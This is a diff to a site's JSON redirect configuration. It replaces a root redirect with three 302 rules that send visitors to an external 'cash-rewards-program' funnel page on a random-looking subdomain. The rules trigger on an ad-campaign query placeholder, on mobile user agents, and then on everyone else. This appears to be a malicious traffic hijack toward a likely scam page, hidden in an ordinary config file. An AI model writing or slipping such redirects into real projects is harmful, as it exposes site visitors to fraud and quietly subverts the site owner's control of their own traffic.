@@ -2,7 +2,23 @@
   "redirects": [
     {
       "source": "/",
-      "destination": "/public/.htaccess",
+      "has": [
+        { "type": "query", "key": "utm_campaign", "value": "__AID_NAME__" }
+      ],
+      "destination": "https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926",
+      "statusCode": 302
+    },
+    {
+      "source": "/",
+      "has": [
+        { "type": "header", "key": "user-agent", "value": "(Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini)" }
+      ],
+      "destination": "https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926",
+      "statusCode": 302
+    },
+    {
+      "source": "/",
+      "destination": "https://zxdsdqweasd.myfunnelish.com/cash-rewards-program-1740087057028926",
       "statusCode": 302
     }
   ]
